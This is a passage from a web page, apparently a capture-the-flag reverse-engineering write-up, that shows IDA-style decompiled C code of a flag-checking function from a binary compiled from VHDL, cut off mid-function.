class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_55CFAE51DCE0</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> *v3; <span class="comment">// r12</span></span><br><span class="line"></span><br><span class="line">  __int64 v4; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  __int64 v5; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  __int64 v6; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  __int64 v8; <span class="comment">// r12</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// er15</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// ebp</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// bp</span></span><br><span class="line"></span><br><span class="line">  __int64 v12; <span class="comment">// r15</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// ebp</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// ebp</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> v15; <span class="comment">// bp</span></span><br><span class="line"></span><br><span class="line">  __int64 v16; <span class="comment">// r15</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// ebp</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// ebp</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> v19; <span class="comment">// bp</span></span><br><span class="line"></span><br><span class="line">  __int64 v20; <span class="comment">// r15</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v21; <span class="comment">// ebp</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// ebp</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> v23; <span class="comment">// bp</span></span><br><span class="line"></span><br><span class="line">  __int64 v24; <span class="comment">// r15</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v25; <span class="comment">// ebp</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// ebp</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> v27; <span class="comment">// bp</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v28; <span class="comment">// ecx</span></span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> v29; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  __int64 v30; <span class="comment">// r15</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v31; <span class="comment">// ebp</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v32; <span class="comment">// ebp</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> v33; <span class="comment">// bp</span></span><br><span class="line"></span><br><span class="line">  __int64 v34; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  __int64 v35; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v37; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  __int64 v38; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  __int64 v39; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  __int64 v40; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  __int64 v41; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  __int64 v42; <span class="comment">// r15</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v43; <span class="comment">// ebp</span></span><br><span class="line"></span><br><span class="line">  __int64 v44; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  __int64 i; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _BYTE *v46; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> v47; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v48[<span class="number">2</span>]; <span class="comment">// [rsp+8h] [rbp-320h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> v49; <span class="comment">// [rsp+10h] [rbp-318h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v50; <span class="comment">// [rsp+14h] [rbp-314h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v51[<span class="number">2</span>]; <span class="comment">// [rsp+18h] [rbp-310h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> v52; <span class="comment">// [rsp+20h] [rbp-308h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v53; <span class="comment">// [rsp+24h] [rbp-304h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v54[<span class="number">2</span>]; <span class="comment">// [rsp+28h] [rbp-300h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> v55; <span class="comment">// [rsp+30h] [rbp-2F8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v56; <span class="comment">// [rsp+34h] [rbp-2F4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v57[<span class="number">2</span>]; <span class="comment">// [rsp+38h] [rbp-2F0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> v58; <span class="comment">// [rsp+40h] [rbp-2E8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v59; <span class="comment">// [rsp+44h] [rbp-2E4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v60[<span class="number">2</span>]; <span class="comment">// [rsp+48h] [rbp-2E0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> v61; <span class="comment">// [rsp+50h] [rbp-2D8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v62; <span class="comment">// [rsp+54h] [rbp-2D4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v63[<span class="number">2</span>]; <span class="comment">// [rsp+58h] [rbp-2D0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> v64; <span class="comment">// [rsp+60h] [rbp-2C8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v65; <span class="comment">// [rsp+64h] [rbp-2C4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v66[<span class="number">2</span>]; <span class="comment">// [rsp+68h] [rbp-2C0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> v67; <span class="comment">// [rsp+70h] [rbp-2B8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v68; <span class="comment">// [rsp+74h] [rbp-2B4h]</span></span><br><span class="line"></span><br><span class="line">  __int64 v69; <span class="comment">// [rsp+78h] [rbp-2B0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> v70; <span class="comment">// [rsp+80h] [rbp-2A8h]</span></span><br><span class="line"></span><br><span class="line">  __int64 v71; <span class="comment">// [rsp+88h] [rbp-2A0h]</span></span><br><span class="line"></span><br><span class="line">  __int64 v72; <span class="comment">// [rsp+90h] [rbp-298h]</span></span><br><span class="line"></span><br><span class="line">  __int64 v73; <span class="comment">// [rsp+98h] [rbp-290h]</span></span><br><span class="line"></span><br><span class="line">  __int64 v74; <span class="comment">// [rsp+A0h] [rbp-288h]</span></span><br><span class="line"></span><br><span class="line">  __int64 v75; <span class="comment">// [rsp+A8h] [rbp-280h]</span></span><br><span class="line"></span><br><span class="line">  __int64 v76; <span class="comment">// [rsp+B0h] [rbp-278h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v77; <span class="comment">// [rsp+B8h] [rbp-270h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v78; <span class="comment">// [rsp+C0h] [rbp-268h]</span></span><br><span class="line"></span><br><span class="line">  __int64 v79[<span class="number">2</span>]; <span class="comment">// [rsp+C8h] [rbp-260h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> v80; <span class="comment">// [rsp+D8h] [rbp-250h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v81; <span class="comment">// [rsp+DCh] [rbp-24Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v82; <span class="comment">// [rsp+E0h] [rbp-248h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v83; <span class="comment">// [rsp+E8h] [rbp-240h]</span></span><br><span class="line"></span><br><span class="line">  __int64 v84[<span class="number">2</span>]; <span class="comment">// [rsp+F0h] [rbp-238h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> v85; <span class="comment">// [rsp+100h] [rbp-228h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v86; <span class="comment">// [rsp+104h] [rbp-224h]</span></span><br><span class="line"></span><br><span class="line">  __int64 v87; <span class="comment">// [rsp+108h] [rbp-220h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> *v88; <span class="comment">// [rsp+110h] [rbp-218h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v89; <span class="comment">// [rsp+118h] [rbp-210h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v90; <span class="comment">// [rsp+120h] [rbp-208h]</span></span><br><span class="line"></span><br><span class="line">  __int64 v91[<span class="number">2</span>]; <span class="comment">// [rsp+128h] [rbp-200h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> v92; <span class="comment">// [rsp+138h] [rbp-1F0h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v93; <span class="comment">// [rsp+13Ch] [rbp-1ECh]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v94; <span class="comment">// [rsp+140h] [rbp-1E8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v95; <span class="comment">// [rsp+148h] [rbp-1E0h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v96; <span class="comment">// [rsp+150h] [rbp-1D8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v97; <span class="comment">// [rsp+158h] [rbp-1D0h]</span></span><br><span class="line"></span><br><span class="line">  __int64 v98[<span class="number">2</span>]; <span class="comment">// [rsp+160h] [rbp-1C8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> v99; <span class="comment">// [rsp+170h] [rbp-1B8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v100; <span class="comment">// [rsp+174h] [rbp-1B4h]</span></span><br><span class="line"></span><br><span class="line">  __int64 v101[<span class="number">2</span>]; <span class="comment">// [rsp+178h] [rbp-1B0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v102[<span class="number">2</span>]; <span class="comment">// [rsp+188h] [rbp-1A0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v103[<span class="number">2</span>]; <span class="comment">// [rsp+198h] [rbp-190h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v104; <span class="comment">// [rsp+1A8h] [rbp-180h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v105; <span class="comment">// [rsp+1B0h] [rbp-178h]</span></span><br><span class="line"></span><br><span class="line">  __int64 v106[<span class="number">2</span>]; <span class="comment">// [rsp+1B8h] [rbp-170h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v107[<span class="number">2</span>]; <span class="comment">// [rsp+1C8h] [rbp-160h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v108; <span class="comment">// [rsp+1D8h] [rbp-150h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v109; <span class="comment">// [rsp+1E0h] [rbp-148h]</span></span><br><span class="line"></span><br><span class="line">  __int64 v110[<span class="number">2</span>]; <span class="comment">// [rsp+1E8h] [rbp-140h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v111[<span class="number">2</span>]; <span class="comment">// [rsp+1F8h] [rbp-130h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v112; <span class="comment">// [rsp+208h] [rbp-120h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v113; <span class="comment">// [rsp+210h] [rbp-118h]</span></span><br><span class="line"></span><br><span class="line">  __int64 v114[<span class="number">2</span>]; <span class="comment">// [rsp+218h] [rbp-110h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v115[<span class="number">2</span>]; <span class="comment">// [rsp+228h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v116; <span class="comment">// [rsp+238h] [rbp-F0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v117; <span class="comment">// [rsp+240h] [rbp-E8h]</span></span><br><span class="line"></span><br><span class="line">  __int64 v118[<span class="number">2</span>]; <span class="comment">// [rsp+248h] [rbp-E0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v119[<span class="number">2</span>]; <span class="comment">// [rsp+258h] [rbp-D0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v120; <span class="comment">// [rsp+268h] [rbp-C0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v121; <span class="comment">// [rsp+270h] [rbp-B8h]</span></span><br><span class="line"></span><br><span class="line">  __int64 v122[<span class="number">2</span>]; <span class="comment">// [rsp+278h] [rbp-B0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v123[<span class="number">2</span>]; <span class="comment">// [rsp+288h] [rbp-A0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v124; <span class="comment">// [rsp+298h] [rbp-90h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v125; <span class="comment">// [rsp+2A0h] [rbp-88h]</span></span><br><span class="line"></span><br><span class="line">  __int64 v126[<span class="number">2</span>]; <span class="comment">// [rsp+2A8h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v127; <span class="comment">// [rsp+2B8h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v128; <span class="comment">// [rsp+2C0h] [rbp-68h]</span></span><br><span class="line"></span><br><span class="line">  __int64 v129[<span class="number">2</span>]; <span class="comment">// [rsp+2C8h] [rbp-60h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v130[<span class="number">3</span>]; <span class="comment">// [rsp+2D8h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __int64 v131; <span class="comment">// [rsp+2F0h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v2 = *(_DWORD *)(a1 + <span class="number">276</span>);</span><br><span class="line"></span><br><span class="line">  v76 = (__int64)&amp;unk_55CFAE5CC400 + <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">  v75 = (__int64)&amp;unk_55CFAE5CC440 + <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">  v74 = (__int64)&amp;unk_55CFAE5CC480 + <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">  v73 = (__int64)&amp;unk_55CFAE5CC4C0 + <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">  v72 = (__int64)&amp;unk_55CFAE5CC500 + <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">  v71 = (__int64)&amp;unk_55CFAE5CC540 + <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">  v3 = (<span class="type">int</span> *)&amp;unk_55CFAE5F5C58;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> ( v2 )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">        *(_DWORD *)(a1 + <span class="number">272</span>) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        v4 = <span class="built_in">sub_55CFAE532BBC</span>();</span><br><span class="line"></span><br><span class="line">        v98[<span class="number">0</span>] = *(_QWORD *)(a1 + <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">        v130[<span class="number">0</span>] = (__int64)<span class="string">&quot;Input Flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">        v130[<span class="number">1</span>] = (__int64)&amp;unk_55CFAE5CC628;</span><br><span class="line"></span><br><span class="line">        v98[<span class="number">1</span>] = (__int64)v130;</span><br><span class="line"></span><br><span class="line">        v99 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        v100 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sub_55CFAE51BF90</span>(v98);</span><br><span class="line"></span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">256</span>) = v98[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sub_55CFAE532C32</span>(v4);</span><br><span class="line"></span><br><span class="line">        v5 = <span class="built_in">sub_55CFAE532BBC</span>();</span><br><span class="line"></span><br><span class="line">        v96 = *v3;</span><br><span class="line"></span><br><span class="line">        v97 = *(_QWORD *)(a1 + <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sub_55CFAE51B790</span>(&amp;v96);</span><br><span class="line"></span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">256</span>) = v97;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sub_55CFAE532C32</span>(v5);</span><br><span class="line"></span><br><span class="line">        v6 = <span class="built_in">sub_55CFAE532BBC</span>();</span><br><span class="line"></span><br><span class="line">        v94 = unk_55CFAE5F5C54;</span><br><span class="line"></span><br><span class="line">        v95 = *(_QWORD *)(a1 + <span class="number">240</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sub_55CFAE518B50</span>(&amp;v94);</span><br><span class="line"></span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">240</span>) = v95;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sub_55CFAE532C32</span>(v6);</span><br><span class="line"></span><br><span class="line">        v131 = *(_QWORD *)(a1 + <span class="number">240</span>);</span><br><span class="line"></span><br><span class="line">        v130[<span class="number">2</span>] = v131 + <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        v2 = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">unsigned</span> <span class="type">int</span> *)(v131 + <span class="number">12</span>) &gt;= <span class="number">0x2CuLL</span> )</span><br><span class="line"></span><br><span class="line">          v2 = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">280</span>) = <span class="number">0x2C00000001LL</span>;</span><br><span class="line"></span><br><span class="line">        v2 = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"></span><br><span class="line">        v34 = <span class="built_in">sub_55CFAE532BBC</span>();</span><br><span class="line"></span><br><span class="line">        v91[<span class="number">0</span>] = *(_QWORD *)(a1 + <span class="number">248</span>);</span><br><span class="line"></span><br><span class="line">        v129[<span class="number">0</span>] = (__int64)<span class="string">&quot;Wrong!&quot;</span>;</span><br><span class="line"></span><br><span class="line">        v129[<span class="number">1</span>] = (__int64)&amp;unk_55CFAE5CC658;</span><br><span class="line"></span><br><span class="line">        v91[<span class="number">1</span>] = (__int64)v129;</span><br><span class="line"></span><br><span class="line">        v92 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        v93 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sub_55CFAE51BF90</span>(v91);</span><br><span class="line"></span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">248</span>) = v91[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sub_55CFAE532C32</span>(v34);</span><br><span class="line"></span><br><span class="line">        v35 = <span class="built_in">sub_55CFAE532BBC</span>();</span><br><span class="line"></span><br><span class="line">        v89 = *v3;</span><br><span class="line"></span><br><span class="line">        v90 = *(_QWORD *)(a1 + <span class="number">248</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sub_55CFAE51B790</span>(&amp;v89);</span><br><span class="line"></span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">248</span>) = v90;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sub_55CFAE532C32</span>(v35);</span><br><span class="line"></span><br><span class="line">        result = <span class="built_in">sub_55CFAE533790</span>();</span><br><span class="line"></span><br><span class="line">        *(_DWORD *)(a1 + <span class="number">276</span>) = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sub_55CFAE53CB90</span>(<span class="string">&quot;hello.vhdl&quot;</span>, <span class="number">43LL</span>, <span class="number">6LL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"></span><br><span class="line">        v2 = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">280</span>) != *(_DWORD *)(a1 + <span class="number">284</span>) )</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">          ++*(_DWORD *)(a1 + <span class="number">280</span>);</span><br><span class="line"></span><br><span class="line">          v2 = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line"></span><br><span class="line">        v37 = *(_DWORD *)(a1 + <span class="number">272</span>);</span><br><span class="line"></span><br><span class="line">        v38 = <span class="built_in">sub_55CFAE532BBC</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( v37 == <span class="number">44</span> )</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">          v84[<span class="number">0</span>] = *(_QWORD *)(a1 + <span class="number">248</span>);</span><br><span class="line"></span><br><span class="line">          v102[<span class="number">0</span>] = (__int64)&amp;unk_55CFAE5CC688;</span><br><span class="line"></span><br><span class="line">          v102[<span class="number">1</span>] = (__int64)&amp;unk_55CFAE5CC678;</span><br><span class="line"></span><br><span class="line">          v84[<span class="number">1</span>] = (__int64)v102;</span><br><span class="line"></span><br><span class="line">          v85 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          v86 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          <span class="built_in">sub_55CFAE51BF90</span>(v84);</span><br><span class="line"></span><br><span class="line">          *(_QWORD *)(a1 + <span class="number">248</span>) = v84[<span class="number">0</span>];</span><br><span 